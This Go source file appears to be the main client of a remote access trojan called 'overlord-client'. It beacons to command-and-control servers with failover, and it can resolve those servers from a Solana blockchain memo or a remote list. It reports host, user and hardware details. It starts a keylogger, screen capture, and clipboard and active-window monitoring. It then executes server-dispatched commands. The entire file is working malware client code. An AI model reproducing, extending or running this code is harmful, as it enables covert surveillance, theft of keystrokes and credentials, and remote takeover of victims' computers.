package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"time"

	"overlord-client/cmd/agent/activewindow"
	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/handlers"
	"overlord-client/cmd/agent/keylogger"
	"overlord-client/cmd/agent/plugins"
	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/sysinfo"
	"overlord-client/cmd/agent/wire"

	"nhooyr.io/websocket"
)

func isRunningInMemory() bool {
	exePath, err := os.Executable()
	if err != nil {
		return true
	}
	if realPath, err := filepath.EvalSymlinks(exePath); err == nil {
		exePath = realPath
	}
	absPath, err := filepath.Abs(exePath)
	if err != nil {
		return true
	}
	info, err := os.Stat(absPath)
	if err != nil || !info.Mode().IsRegular() {
		return true
	}
	return false
}

func runClient(cfg config.Config) {
	baseBackoff := computeBaseBackoff()
	backoff := baseBackoff
	log.Printf("runtime GOOS=%s GOARCH=%s cfg.OS=%s cfg.Arch=%s", runtime.GOOS, runtime.GOARCH, cfg.OS, cfg.Arch)

	ensureServerURLs(&cfg, baseBackoff)

	if len(cfg.ServerURLs) > 1 {
		log.Printf("Failover enabled with %d servers:", len(cfg.ServerURLs))
		for i, url := range cfg.ServerURLs {
			marker := ""
			if i == cfg.ServerIndex {
				marker = " (starting here)"
			}
			log.Printf("  [%d] %s%s", i, url, marker)
		}
	}

	tlsMinVersion := uint16(tls.VersionTLS12)
	transport := createHTTPTransport(cfg, tlsMinVersion)
	currentIndex := cfg.ServerIndex
	consecutiveFailures := 0
	// idek how tf to fix this. sometimes the client just says fuck you and downgrades then stops connections.
	allowTLSDowngrade := false
	var lastDisconnect time.Time
	var lastSolRefresh time.Time
	solInitialWait := 2 * time.Minute
	solRefreshInterval := 2*time.Minute + time.Duration(rand.Intn(60))*time.Second

	for {

		if currentIndex >= len(cfg.ServerURLs) {
			currentIndex = 0
		}

		currentServer := cfg.ServerURLs[currentIndex]
		ctx, cancel := context.WithCancel(context.Background())
		url := fmt.Sprintf("%s/api/clients/%s/stream/ws?role=client", currentServer, cfg.ID)

		opts := buildDialOptions(cfg, transport)

		serverInfo := ""
		if len(cfg.ServerURLs) > 1 {
			serverInfo = fmt.Sprintf(" [%d/%d]", currentIndex+1, len(cfg.ServerURLs))
		}
		log.Printf("connecting to %s%s (TLS verify: %v)", currentServer, serverInfo, !cfg.TLSInsecureSkipVerify)

		conn, _, err := websocket.Dial(ctx, url, opts)
		if err != nil {
			log.Printf("dial failed: %v (retrying in %s)", err, backoff)
			consecutiveFailures++
			if lastDisconnect.IsZero() {
				lastDisconnect = time.Now()
			}

			if shouldRefreshServerList(cfg, consecutiveFailures, lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
				if refreshServerList(&cfg) {
					lastSolRefresh = time.Now()
					currentIndex = 0
					consecutiveFailures = 0
				}
			}

			if len(cfg.ServerURLs) > 1 {
				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
			}

			time.Sleep(backoff)
			cancel()
			continue
		}

		if currentIndex != cfg.ServerIndex {
			if err := config.SaveServerIndex(currentIndex); err != nil {
				log.Printf("Warning: failed to save server index: %v", err)
			}
		}

		backoff = baseBackoff
		consecutiveFailures = 0
		lastDisconnect = time.Time{} // reset — we're connected
		log.Printf("connected successfully to %s%s", currentServer, serverInfo)

		conn.SetReadLimit(8 * 1024 * 1024)

		var sessionErr error
		if err := runSession(ctx, cancel, conn, cfg); err != nil {
			sessionErr = err
			if allowTLSDowngrade && isTLSVersionError(err) {
				log.Printf("[TLS] remote rejected TLS version; downgrading to TLS 1.0 for compatibility")
				tlsMinVersion = uint16(tls.VersionTLS10)
				transport = createHTTPTransport(cfg, tlsMinVersion)
				allowTLSDowngrade = false
			}
			log.Printf("session ended: %v (retrying in %s)", err, backoff)
			lastDisconnect = time.Now()

			if shouldRefreshServerList(cfg, len(cfg.ServerURLs), lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
				if refreshServerList(&cfg) {
					lastSolRefresh = time.Now()
					currentIndex = 0
					consecutiveFailures = 0
				}
			}

			if len(cfg.ServerURLs) > 1 {
				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
			}
		}

		sleepFor := backoff
		if sessionErr != nil && shouldRetryImmediately(sessionErr) {
			sleepFor = reconnectDelay()
			log.Printf("reconnect: immediate retry in %s", sleepFor)
		}
		if sessionErr != nil {
			if d := enrollmentRetryDelay(sessionErr); d > 0 {
				sleepFor = d
				log.Printf("purgatory: retry in %s", sleepFor)
			}
		}
		time.Sleep(sleepFor)
	}
}

func buildDialOptions(cfg config.Config, transport *http.Transport) *websocket.DialOptions {
	headers := http.Header{}
	if token := strings.TrimSpace(cfg.AgentToken); token != "" {
		headers.Set("x-agent-token", token)
	}
	return &websocket.DialOptions{
		Subprotocols:    []string{"binary"},
		HTTPClient:      &http.Client{Transport: transport},
		HTTPHeader:      headers,
		CompressionMode: websocket.CompressionContextTakeover,
	}
}

func ensureServerURLs(cfg *config.Config, backoff time.Duration) {
	if len(cfg.ServerURLs) > 0 {
		return
	}

	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
		log.Printf("No server URLs configured. Resolving from Solana memo (address: %s)", cfg.SolAddress)
		for len(cfg.ServerURLs) == 0 {
			if refreshServerURLsFromSolana(cfg) {
				return
			}
			log.Printf("Retrying Solana memo lookup in %s", backoff)
			time.Sleep(backoff)
		}
		return
	}

	if cfg.RawServerListURL == "" {
		log.Printf("[config] WARNING: no server URLs configured; falling back to default %s", config.DefaultServerURL)
		cfg.ServerURLs = []string{config.DefaultServerURL}
		return
	}

	log.Printf("No server URLs configured. Fetching raw list from %s", cfg.RawServerListURL)
	for len(cfg.ServerURLs) == 0 {
		if refreshServerURLsFromRaw(cfg) {
			return
		}
		log.Printf("Retrying raw server list fetch in %s", backoff)
		time.Sleep(backoff)
	}
}

func shouldRefreshRawList(cfg config.Config, failures int) bool {
	if cfg.RawServerListURL == "" {
		return false
	}
	if len(cfg.ServerURLs) == 0 {
		return true
	}
	return failures >= len(cfg.ServerURLs)
}

func shouldRefreshServerList(cfg config.Config, failures int, lastDisconnect, lastSolRefresh time.Time, solInitialWait, solRefreshInterval time.Duration) bool {
	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
		if lastDisconnect.IsZero() {
			return false // still connected, never refresh
		}
		sinceDisconnect := time.Since(lastDisconnect)
		if sinceDisconnect < solInitialWait {
			return false // wait 2 min after disconnect before first check
		}
		if !lastSolRefresh.IsZero() && time.Since(lastSolRefresh) < solRefreshInterval {
			return false // not yet time for next periodic check
		}
		return true
	}
	return shouldRefreshRawList(cfg, failures)
}

func refreshServerList(cfg *config.Config) bool {
	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
		return refreshServerURLsFromSolana(cfg)
	}
	return refreshServerURLsFromRaw(cfg)
}

func refreshServerURLsFromSolana(cfg *config.Config) bool {
	urls, err := config.LoadServerURLsFromSolana(cfg.SolAddress, cfg.AgentToken, cfg.SolRPCEndpoints)
	if err != nil {
		log.Printf("[config] WARNING: failed to resolve server URLs from Solana: %v", err)
		return false
	}
	if len(urls) == 0 {
		log.Printf("[config] WARNING: Solana memo returned no valid URLs")
		return false
	}
	if !equalStringSlices(cfg.ServerURLs, urls) {
		log.Printf("[config] resolved server URLs from Solana memo (%d servers)", len(urls))
		cfg.ServerURLs = urls
	}
	return true
}

func refreshServerURLsFromRaw(cfg *config.Config) bool {
	urls, err := config.LoadServerURLsFromRaw(cfg.RawServerListURL)
	if err != nil {
		log.Printf("[config] WARNING: failed to refresh raw server list: %v", err)
		return false
	}

	if len(urls) == 0 {
		log.Printf("[config] WARNING: raw server list returned no URLs")
		return false
	}

	if !equalStringSlices(cfg.ServerURLs, urls) {
		log.Printf("[config] refreshed raw server list (%d servers)", len(urls))
		cfg.ServerURLs = urls
	}
	return true
}

func equalStringSlices(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func createHTTPTransport(cfg config.Config, minVersion uint16) *http.Transport {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: cfg.TLSInsecureSkipVerify,
		MinVersion:         minVersion,
	}

	if cfg.TLSCAPath != "" {
		caCert, err := os.ReadFile(cfg.TLSCAPath)
		if err != nil {
			log.Printf("[TLS] WARNING: Failed to read CA certificate from %s: %v", cfg.TLSCAPath, err)
		} else {
			caCertPool := x509.NewCertPool()
			if caCertPool.AppendCertsFromPEM(caCert) {
				tlsConfig.RootCAs = caCertPool
				log.Printf("[TLS] Loaded custom CA certificate from %s", cfg.TLSCAPath)
			} else {
				log.Printf("[TLS] WARNING: Failed to parse CA certificate from %s", cfg.TLSCAPath)
			}
		}
	}

	if cfg.TLSClientCert != "" && cfg.TLSClientKey != "" {
		cert, err := tls.LoadX509KeyPair(cfg.TLSClientCert, cfg.TLSClientKey)
		if err != nil {
			log.Printf("[TLS] WARNING: Failed to load client certificate: %v", err)
		} else {
			tlsConfig.Certificates = []tls.Certificate{cert}
			log.Printf("[TLS] Loaded client certificate for mutual TLS")
		}
	}

	if cfg.TLSInsecureSkipVerify {
		log.Printf("[TLS] WARNING: Certificate verification is DISABLED. This is insecure!")
	}

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = tlsConfig
	return transport
}

func isTLSVersionError(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "protocol version not supported") ||
		strings.Contains(msg, "tls: protocol version not supported")
}

func computeBaseBackoff() time.Duration {
	mode := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_MODE")))
	_ = mode
	return randomReconnectDelay(10*time.Second, 30*time.Second)
}

func reconnectDelay() time.Duration {
	raw := strings.TrimSpace(os.Getenv("OVERLORD_RECONNECT_DELAY_MS"))
	if raw == "" {
		return randomReconnectDelay(10*time.Second, 30*time.Second)
	}
	ms, err := strconv.Atoi(raw)
	if err != nil || ms < 0 {
		log.Printf("[reconnect] invalid OVERLORD_RECONNECT_DELAY_MS=%q, using 10-30s", raw)
		return randomReconnectDelay(10*time.Second, 30*time.Second)
	}
	if ms == 0 {
		return 0
	}
	return time.Duration(ms) * time.Millisecond
}

var reconnectRng = rand.New(rand.NewSource(time.Now().UnixNano()))

func randomReconnectDelay(min, max time.Duration) time.Duration {
	if max <= min {
		return min
	}
	delta := max - min
	n := time.Duration(reconnectRng.Int63n(int64(delta) + 1))
	return min + n
}

func shouldRetryImmediately(err error) bool {
	if err == nil {
		return false
	}
	if errors.Is(err, handlers.ErrReconnect) {
		return true
	}
	var closeErr *websocket.CloseError
	if errors.As(err, &closeErr) {
		if closeErr.Code == 4001 || closeErr.Code == 4002 || closeErr.Code == 4003 {
			return false
		}
		if closeErr.Code == websocket.StatusNormalClosure || closeErr.Code == websocket.StatusGoingAway {
			return true
		}
		if closeErr.Code == websocket.StatusAbnormalClosure {
			return true
		}
	}
	msg := strings.ToLower(err.Error())
	if strings.Contains(msg, "timed out from inactivity") {
		return true
	}
	if strings.Contains(msg, "use of closed network connection") || strings.Contains(msg, "failed to get reader") {
		return true
	}
	return false
}

func enrollmentRetryDelay(err error) time.Duration {
	if err == nil {
		return 0
	}

	msg := err.Error()
	if strings.Contains(msg, "purgatory: status=pending") {
		return getEnrollmentRetryInterval()
	}
	if strings.Contains(msg, "purgatory: status=denied") {
		return 5 * time.Minute
	}

	var closeErr *websocket.CloseError
	if errors.As(err, &closeErr) {
		switch closeErr.Code {
		case 4001: // pending
			return getEnrollmentRetryInterval()
		case 4002: // invalid signature
			return 60 * time.Second
		case 4003: // denied
			return 5 * time.Minute
		}
	}
	return 0
}

func getEnrollmentRetryInterval() time.Duration {
	raw := strings.TrimSpace(os.Getenv("OVERLORD_ENROLLMENT_RETRY_MS"))
	if raw != "" {
		if ms, err := strconv.Atoi(raw); err == nil && ms > 0 {
			return time.Duration(ms) * time.Millisecond
		}
	}
	return 30 * time.Second
}

func getPingInterval() time.Duration {
	raw := strings.TrimSpace(os.Getenv("OVERLORD_PING_INTERVAL_MS"))
	if raw == "" {
		return 30 * time.Second
	}
	ms, err := strconv.Atoi(raw)
	if err != nil {
		log.Printf("[ping] invalid OVERLORD_PING_INTERVAL_MS=%q, using 30000ms", raw)
		return 30 * time.Second
	}
	if ms <= 0 {
		return 0
	}
	return time.Duration(ms) * time.Millisecond
}

func classifySessionError(err error) (reason, detail string) {
	if err == nil {
		return "crash", ""
	}
	msg := err.Error()
	msgLower := strings.ToLower(msg)
	if strings.Contains(msgLower, "panic") {
		return "panic", truncateStr(msg, 300)
	}
	var closeErr *websocket.CloseError
	if errors.As(err, &closeErr) {
		if closeErr.Code == websocket.StatusNormalClosure || closeErr.Code == websocket.StatusGoingAway {
			return "normal", ""
		}
		return "network", fmt.Sprintf("ws close code=%d reason=%s", closeErr.Code, truncateStr(closeErr.Reason, 100))
	}
	if strings.Contains(msgLower, "timed out from inactivity") || strings.Contains(msgLower, "pong timeout") {
		return "timeout", truncateStr(msg, 300)
	}
	if strings.Contains(msgLower, "context canceled") || strings.Contains(msgLower, "context deadline exceeded") {
		return "normal", ""
	}
	return "network", truncateStr(msg, 300)
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.Conn, cfg config.Config) (err error) {
	defer func() {
		if r := recover(); r != nil {
			reason := fmt.Sprintf("session panic: %v", r)
			stack := debug.Stack()
			path := writeCrashLog(reason, stack)
			log.Printf("%s (see %s)", reason, path)
			err = fmt.Errorf("session panic: %v", r)
		}
	}()
	defer cancel()
	defer func() {
		reason, detail := classifySessionError(err)
		di := wire.DisconnectInfo{Type: "disconnect_info", Reason: reason, Detail: detail}
		sendCtx, sendCancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer sendCancel()
		_ = wire.WriteMsg(sendCtx, conn, di)
		conn.Close(websocket.StatusNormalClosure, "bye")
	}()

	identity := config.DeriveIdentity()
	log.Printf("[purgatory] identity fingerprint=%s", identity.Fingerprint)

	challengeCtx, challengeCancel := context.WithTimeout(ctx, 30*time.Second)
	defer challengeCancel()

	_, challengeData, err := conn.Read(challengeCtx)
	if err != nil {
		return fmt.Errorf("purgatory: failed to read challenge: %w", err)
	}
	challengeEnvelope, err := wire.DecodeEnvelope(challengeData)
	if err != nil {
		return fmt.Errorf("purgatory: failed to decode challenge: %w", err)
	}

	safeWriter := wire.NewSafeWriter(conn)

	msgType, _ := challengeEnvelope["type"].(string)
	var publicKeyB64, signatureB64 string

	switch msgType {
	case "enrollment_challenge":
		nonceB64, _ := challengeEnvelope["nonce"].(string)
		if nonceB64 == "" {
			return fmt.Errorf("purgatory: empty nonce in challenge")
		}
		nonceBytes, decErr := base64.StdEncoding.DecodeString(nonceB64)
		if decErr != nil {
			return fmt.Errorf("purgatory: invalid nonce base64: %w", decErr)
		}
		sig := identity.Sign(nonceBytes)
		publicKeyB64 = identity.PublicKeyBase64()
		signatureB64 = base64.StdEncoding.EncodeToString(sig)
		log.Printf("[purgatory] signed challenge nonce (%d bytes)", len(nonceBytes))

	case "hello_ack":
		log.Printf("[purgatory] legacy server (no challenge), proceeding")
		publicKeyB64 = ""
		signatureB64 = ""

	default:
		return fmt.Errorf("purgatory: unexpected first message type: %s", msgType)
	}

	env := &rt.Env{Conn: safeWriter, Cfg: cfg, Cancel: cancel, SelectedDisplay: handlers.GetPersistedDisplay()}
	env.SetLastPong(time.Now().UnixMilli())
	env.Console = rt.NewConsoleHub(env)
	env.Plugins = plugins.NewManager(env.Conn, plugins.HostInfo{ClientID: cfg.ID, OS: cfg.OS, Arch: cfg.Arch, Version: cfg.Version})
	defer env.Plugins.Close()

	env.Keylogger = keylogger.New()
	if err := env.Keylogger.Start(); err != nil {
		log.Printf("[keylogger] Failed to start: %v", err)
	} else {
		defer env.Keylogger.Stop()
	}

	dispatcher := handlers.NewDispatcher(env)

	osVal := strings.TrimSpace(cfg.OS)
	if osVal == "" {
		osVal = runtime.GOOS
	}

	archVal := strings.TrimSpace(cfg.Arch)
	if archVal == "" {
		archVal = runtime.GOARCH
	}

	hello := wire.Hello{
		Type:        "hello",
		ID:          cfg.ID,
		HWID:        cfg.HWID,
		Host:        rt.Hostname(),
		OS:          osVal,
		Arch:        archVal,
		Version:     cfg.Version,
		User:        rt.CurrentUser(),
		Monitors:    capture.MonitorCount(),
		MonitorInfo: toWireMonitorInfo(capture.MonitorInfos()),
		Country:     cfg.Country,
		BuildTag:    cfg.BuildTag,
		PublicKey:   publicKeyB64,
		Signature:   signatureB64,
		InMemory:    isRunningInMemory(),
	}

	hw := sysinfo.Collect()
	hello.CPU = hw.CPU
	hello.GPU = hw.GPU
	hello.RAM = hw.RAM

	if err := wire.WriteMsg(ctx, env.Conn, hello); err != nil {
		return fmt.Errorf("send hello: %w", err)
	}

	if msgType == "enrollment_challenge" {
		ackCtx, ackCancel := context.WithTimeout(ctx, 30*time.Second)
		defer ackCancel()

		for {
			_, ackData, err := conn.Read(ackCtx)
			if err != nil {
				return fmt.Errorf("purgatory: failed to read response: %w", err)
			}
			ackEnvelope, err := wire.DecodeEnvelope(ackData)
			if err != nil {
				return fmt.Errorf("purgatory: failed to decode response: %w", err)
			}

			ackType, _ := ackEnvelope["type"].(string)
			switch ackType {
			case "hello_ack":
				log.Printf("[purgatory] approved, proceeding with session")

				if err := handlers.HandleHelloAck(ackCtx, env, ackEnvelope); err != nil {
					log.Printf("[purgatory] hello_ack handler error: %v", err)
				}
			case "enrollment_status":
				status, _ := ackEnvelope["status"].(string)
				log.Printf("[purgatory] server returned status=%s", status)
				return fmt.Errorf("purgatory: status=%s", status)
			case "ping", "pong":
				continue
			default:
				return fmt.Errorf("purgatory: unexpected response type: %s", ackType)
			}
			break
		}
	}

	if err := wire.WriteMsg(ctx, env.Conn, wire.Ping{Type: "ping", TS: time.Now().UnixMilli()}); err != nil {
		log.Printf("ping: failed to send initial ping: %v", err)
		cancel()
		return fmt.Errorf("send initial ping: %w", err)
	}

	if interval := getPingInterval(); interval > 0 {
		log.Printf("ping: heartbeat interval=%s", interval)
		goSafe("ping loop", cancel, func() {
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					ping := wire.Ping{Type: "ping", TS: time.Now().UnixMilli()}
					if err := wire.WriteMsg(ctx, env.Conn, ping); err != nil {
						log.Printf("ping: failed to send: %v", err)
						cancel()
						return
					}
				}
			}
		})
		goSafe("pong watchdog", cancel, func() {
			grace := interval + (10 * time.Second)
			if grace < 20*time.Second {
				grace = 20 * time.Second
			}
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					last := env.LastPong()
					if !last.IsZero() && time.Since(last) > grace {
						log.Printf("ping: no pong for %s, forcing reconnect", time.Since(last))
						conn.Close(websocket.StatusGoingAway, "pong timeout")
						cancel()
						return
					}
				}
			}
		})
	}

	readErr := make(chan error, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				reason := fmt.Sprintf("readLoop panic: %v", r)
				stack := debug.Stack()
				path := writeCrashLog(reason, stack)
				log.Printf("%s (see %s)", reason, path)
				err := fmt.Errorf("%s", reason)
				select {
				case readErr <- err:
				default:
				}
				cancel()
			}
		}()

		err := readLoop(ctx, conn, env, dispatcher)
		if err == nil {
			err = fmt.Errorf("readLoop exited unexpectedly")
		}
		log.Printf("readLoop ended: %v", err)
		select {
		case readErr <- err:
		default:
		}
		cancel()
	}()

	shotCtx, cancelShots := context.WithCancel(ctx)
	defer cancelShots()
	goSafe("capture loop", cancel, func() {
		capture.Loop(shotCtx, env)
	})

	goSafe("activewindow", nil, func() {
		if err := activewindow.Start(ctx, env); err != nil {
			log.Printf("activewindow error: %v", err)
		}
	})

	goSafe("clipboard", nil, func() {
		if err := activewindow.StartClipboard(ctx, env); err != nil {
			log.Printf("clipboard error: %v", err)
		}
	})

	return <-readErr
}

func toWireMonitorInfo(infos []capture.MonitorInfo) []wire.MonitorInfo {
	if len(infos) == 0 {
		return nil
	}
	out := make([]wire.MonitorInfo, 0, len(infos))
	for _, info := range infos {
		out = append(out, wire.MonitorInfo{Width: info.Width, Height: info.Height})
	}
	return out
}

func readLoop(ctx context.Context, conn *websocket.Conn, env *rt.Env, dispatcher *handlers.Dispatcher) error {
	for {
		_, data, err := conn.Read(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return err
			}
			var closeErr *websocket.CloseError
			if errors.As(err, &closeErr) {
				log.Printf("readLoop: websocket close code=%d reason=%q", closeErr.Code, closeErr.Reason)
			}
			log.Printf("readLoop: read error: %v", err)
			return err
		}
		envelope, err := wire.DecodeEnvelope(data)
		if err != nil {
			log.Printf("decode: %v (bytes=%d)", err, len(data))
			continue
		}
		if err := dispatcher.Dispatch(ctx, envelope); err != nil {
			log.Printf("dispatcher error: %v (type=%v)", err, envelope["type"])
			return err
		}
	}
}
